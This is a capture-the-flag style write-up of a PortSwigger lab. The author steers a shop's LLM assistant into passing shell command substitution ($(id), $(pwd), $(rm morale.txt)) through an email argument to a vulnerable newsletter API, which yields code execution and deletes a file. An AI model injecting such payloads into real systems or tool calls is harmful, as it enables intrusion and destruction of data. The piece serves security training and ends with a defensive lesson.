---
title: "PortSwigger: LLM APIs and OS command injection"
description: "PortSwigger Web LLM lab: the newsletter API the assistant can call
  builds a shell command from the email argument, so command substitution turns
  it into RCE and deletes a file."
date: 2026-09-27
tags:
  - ai-red-team
  - command-injection
  - rce
  - owasp-llm06
  - portswigger
featured: false
---

> target : PortSwigger Web Security Academy lab, "Exploiting vulnerabilities in LLM APIs".
> the goal : delete `/home/carlos/morale.txt`.
> the path : the shop assistant can call a newsletter API, that API builds a shell command from the email argument without sanitising it, so `$(...)` command substitution in the email gives me code execution as carlos.

## Mapping the attack surface

First I ask the assistant which APIs it has access to and what arguments each one takes. It lists three: password reset, newsletter subscription, and product info.

The password reset needs an account i don't have, so it is awkward to test. The newsletter subscription is the better first target: it takes an email address, and to delete a file i am going to need code execution, which is exactly the kind of thing an email-sending backend can leak (these APIs often shell out to a mail command).

## Proving the LLM really calls the API

Before anything clever, i want to confirm the assistant actually reaches the backend. I reached for a throwaway temp inbox first out of habit:

![](images/llm-api-command-injection-1.png)

Then i noticed the lab already hands you an email client on the exploit server, which is where confirmations land:

![](images/llm-api-command-injection-2.png)

So i ask the assistant to subscribe `attacker@YOUR-EXPLOIT-SERVER.exploit-server.net`, and a confirmation email shows up in that client:

![](images/llm-api-command-injection-3.png)

That confirms the loop: my words in the chat become a real newsletter API call, and the result is observable in the email client. The email recipient is now my oracle.

## Testing the email argument

The email string is user input that ends up in whatever command the backend runs to send the mail. So i try to smuggle a shell command into it with `$(...)`, which the shell evaluates before running the real command:

![](images/llm-api-command-injection-4.png)

I subscribe `$(id)@...exploit-server.net`. If the backend passes this through a shell, `id` runs and its output replaces `$(id)` in the recipient. And it does:

![](images/llm-api-command-injection-5.png)

The email came in addressed to `uid=12002(carlos) gid=12002(carlos) groups=12002(carlos)@...`. Confirmed OS command injection, and i am running as carlos. The output of my command lands in the recipient field, so the email client is a clean read channel for a blind RCE.

## Finding the file

I need to know where i am before deleting anything, so i send `$(pwd)@...`:

![](images/llm-api-command-injection-6.png)

The confirmation comes back addressed to `/home/carlos@...`, so the working directory is already carlos' home, where `morale.txt` lives:

![](images/llm-api-command-injection-7.png)

## Deleting morale.txt

Since pwd is already `/home/carlos`, a relative path is enough. I subscribe `$(rm morale.txt)@...`:

![](images/llm-api-command-injection-8.png)

The assistant complains that the email address is invalid, which actually makes sense: `rm` prints nothing, so the substitution leaves an empty local part and the address is malformed. The command still ran before the address was validated, and the solved banner pops:

![](images/llm-api-command-injection-9.png)

## What I take from it

The assistant never did anything wrong, it just relayed my argument to the newsletter API. The bug is downstream: that API builds a shell command out of the email string, so classic `$(...)` command injection applies. The LLM was a tunnel to a command injection i could not reach directly.

The neat part was the email recipient doubling as an output channel. The RCE is blind on the server, but every command's stdout comes back as the address the confirmation is sent to, so `$(id)` and `$(pwd)` read the system out loud. Once pwd showed `/home/carlos`, deleting the file was one relative `rm`.

Two labs, two different lessons on the same surface. The excessive agency one was a tool that should not have existed (raw SQL). This one is a legitimate tool with a vulnerable implementation (shell injection). Same fix direction either way: whatever the model can call has to be safe on its own, because the model will call it.
